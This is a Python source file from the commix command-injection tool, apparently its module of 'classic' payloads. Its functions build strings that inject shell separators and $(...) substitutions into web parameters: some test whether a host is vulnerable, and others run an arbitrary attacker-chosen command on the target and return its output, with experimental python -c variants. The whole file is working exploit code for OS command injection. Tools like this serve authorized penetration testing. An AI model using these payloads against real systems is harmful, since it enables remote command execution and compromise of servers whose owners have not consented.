#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

"""
  The classic injection technique on Classic OS Command Injection.
  The available "classic" payloads.
"""

# ----------------------------------------------------------
# Classic decision payload (check if host is vulnerable).
# ----------------------------------------------------------
def decision(separator, TAG, randv1, randv2):
  payload = (separator + 
            "echo " + TAG +
            "$((" + str(randv1) + "%2B" + str(randv2) + "))"  +
            "$(echo " + TAG + ")" + TAG + ""
             ) 
  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_shell(separator, TAG, randv1, randv2):
  payload = (separator + 
            " python -c \"print '" + TAG + "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" + TAG + "'%2B'" + TAG + "'\""
             )
  return payload

# ---------------------------------------------
# Execute shell commands on vulnerable host.
# ---------------------------------------------
def cmd_execution(separator, TAG, cmd):
  payload = (separator + 
            "echo " + TAG +
            "$(echo " + TAG + ")" +
            "$(echo $(" + cmd + "))"+
            "$(echo " + TAG + ")" + TAG + ""
            )
  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_shell(separator, TAG, cmd):
  payload = (separator + 
            " python -c \"print'" + TAG + "'%2B'" + TAG + "'%2B'$(echo $("+cmd+"))'%2B'"+ TAG + "'%2B'" + TAG + "'\""
            )
  return payload

